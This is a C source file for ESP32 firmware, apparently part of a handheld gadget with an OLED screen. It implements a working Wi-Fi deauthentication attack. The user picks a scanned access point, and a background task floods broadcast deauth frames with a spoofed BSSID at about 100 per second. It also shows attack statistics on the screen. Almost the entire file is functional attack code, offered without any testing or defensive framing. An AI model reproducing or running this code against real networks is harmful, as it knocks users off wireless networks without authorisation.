#include "wifi_attack.h"
#include "wifi_scan.h"
#include "ssd1306.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "wifi_attack";

// 802.11 deauth frame — Addr2/Addr3 filled with target BSSID at attack start
// Reason 7: Class 3 frame received from non-associated station
static const uint8_t deauth_template[26] = {
    0xC0, 0x00,                                     // Frame Control: deauth
    0x3A, 0x01,                                     // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Addr1: broadcast (all clients)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Addr2: AP BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Addr3: AP BSSID (filled)
    0x00, 0x00,                                     // Seq Control
    0x07, 0x00,                                     // Reason Code 7
};

typedef enum {
    ATTACK_STATE_PICK = 0,
    ATTACK_STATE_RUNNING,
} attack_state_t;

static attack_state_t     state         = ATTACK_STATE_PICK;
static uint16_t           scroll_offset = 0;
static uint16_t           selected_idx  = 0;
static uint16_t           target_count  = 0;

// Snapshot of scan results used by the picker (static — no locking needed)
static wifi_ap_info_t     targets[MAX_SCAN_RESULTS];

// Active target fields
static uint8_t  target_bssid[6];
static uint8_t  target_channel;
static char     target_ssid[33];

// Stats updated by the attack task
static volatile uint32_t packets_sent  = 0;
static volatile bool     attacking     = false;
static TaskHandle_t      attack_task_h = NULL;
static int64_t           attack_start_us = 0;

static void attack_task(void *arg) {
    uint8_t frame[26];
    memcpy(frame, deauth_template, sizeof(frame));
    memcpy(frame + 10, target_bssid, 6);    // Addr2 = spoofed AP
    memcpy(frame + 16, target_bssid, 6);    // Addr3 = BSSID

    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    while (attacking) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        if (err == ESP_OK) packets_sent++;
        vTaskDelay(pdMS_TO_TICKS(10));  // ~100 pps max rate
    }

    vTaskDelete(NULL);
}

void wifi_attack_init(void) {
    ESP_LOGI(TAG, "Attack module ready");
}

void wifi_attack_enter(void) {
    state         = ATTACK_STATE_PICK;
    scroll_offset = 0;
    selected_idx  = 0;

    const wifi_ap_info_t *scan = wifi_scan_get_results(&target_count);
    if (target_count > MAX_SCAN_RESULTS) target_count = MAX_SCAN_RESULTS;
    if (scan && target_count > 0) {
        memcpy(targets, scan, sizeof(wifi_ap_info_t) * target_count);
    }
}

bool wifi_attack_has_targets(void) {
    return target_count > 0;
}

void wifi_attack_scroll_up(void) {
    if (selected_idx > 0) {
        selected_idx--;
        if (selected_idx < scroll_offset)
            scroll_offset = selected_idx;
    }
}

void wifi_attack_scroll_down(void) {
    if (target_count > 0 && selected_idx < target_count - 1) {
        selected_idx++;
        if (selected_idx >= scroll_offset + 6)
            scroll_offset = selected_idx - 5;
    }
}

void wifi_attack_select(void) {
    if (target_count == 0) return;

    memcpy(target_bssid, targets[selected_idx].bssid, 6);
    target_channel = targets[selected_idx].channel;
    strncpy(target_ssid, targets[selected_idx].ssid, 32);
    target_ssid[32] = '\0';

    packets_sent     = 0;
    attacking        = true;
    attack_start_us  = esp_timer_get_time();
    state            = ATTACK_STATE_RUNNING;

    xTaskCreate(attack_task, "deauth", 2048, NULL, 6, &attack_task_h);
    ESP_LOGI(TAG, "Attack started: %s ch%u", target_ssid, target_channel);
}

void wifi_attack_stop(void) {
    attacking     = false;
    attack_task_h = NULL;
    state         = ATTACK_STATE_PICK;
    ESP_LOGI(TAG, "Attack stopped: %lu frames sent", (unsigned long)packets_sent);
}

bool wifi_attack_is_running(void) {
    return attacking;
}

// ---------- render helpers ----------

static const char *auth_short(uint8_t sec) {
    switch (sec) {
        case 0: return "OPEN"; case 1: return "WEP ";
        case 2: return "WPA "; case 3: return "WPA2";
        case 6: return "WPA3"; case 7: return "WP23";
        default: return "WPA2";
    }
}

static void render_picker(void) {
    ssd1306_clear_buffer();

    if (target_count == 0) {
        ssd1306_draw_header("Deauth", "No scan results");
        ssd1306_draw_string(0, 3, " Run WiFi Scanner");
        ssd1306_draw_string(0, 4, " first");
        ssd1306_flush();
        return;
    }

    char status[16];
    snprintf(status, sizeof(status), "%u/%u %s",
             selected_idx + 1, target_count,
             auth_short(targets[selected_idx].security));
    ssd1306_draw_header("Deauth", status);

    for (uint8_t row = 0; row < 6; row++) {
        uint16_t idx = scroll_offset + row;
        if (idx >= target_count) break;
        const char *ssid = targets[idx].ssid[0] ? targets[idx].ssid : "Hidden";
        char line[17];
        snprintf(line, sizeof(line), "%c%-10.10s %4d",
                 (idx == selected_idx) ? '>' : ' ',
                 ssid, (int)targets[idx].rssi);
        ssd1306_draw_string(0, row + 2, line);
    }

    ssd1306_flush();
}

static void render_running(void) {
    ssd1306_clear_buffer();

    int64_t elapsed_s = (esp_timer_get_time() - attack_start_us) / 1000000;
    if (elapsed_s < 1) elapsed_s = 1;
    uint32_t pps = packets_sent / (uint32_t)elapsed_s;

    // Yellow zone: target SSID + elapsed time
    char elapsed[16];
    int64_t m = elapsed_s / 60;
    int64_t s = elapsed_s % 60;
    snprintf(elapsed, sizeof(elapsed), "%02lld:%02lld", m, s);
    ssd1306_draw_string(0, 0, target_ssid[0] ? target_ssid : "Hidden");
    ssd1306_draw_string(0, 1, elapsed);

    // Blue zone
    char line[17];

    snprintf(line, sizeof(line), "Ch:%-2u  %s",
             target_channel, target_channel > 14 ? "5GHz" : "2.4G");
    ssd1306_draw_string(0, 2, line);

    snprintf(line, sizeof(line), "%02X:%02X:%02X",
             target_bssid[0], target_bssid[1], target_bssid[2]);
    ssd1306_draw_string(0, 3, line);
    snprintf(line, sizeof(line), "%02X:%02X:%02X",
             target_bssid[3], target_bssid[4], target_bssid[5]);
    ssd1306_draw_string(0, 4, line);

    snprintf(line, sizeof(line), "Sent: %lu", (unsigned long)packets_sent);
    ssd1306_draw_string(0, 5, line);

    snprintf(line, sizeof(line), "~%lu pps LN>stop", (unsigned long)pps);
    ssd1306_draw_string(0, 6, line);

    ssd1306_flush();
}

void wifi_attack_render(void) {
    if (state == ATTACK_STATE_RUNNING) {
        render_running();
    } else {
        render_picker();
    }
}
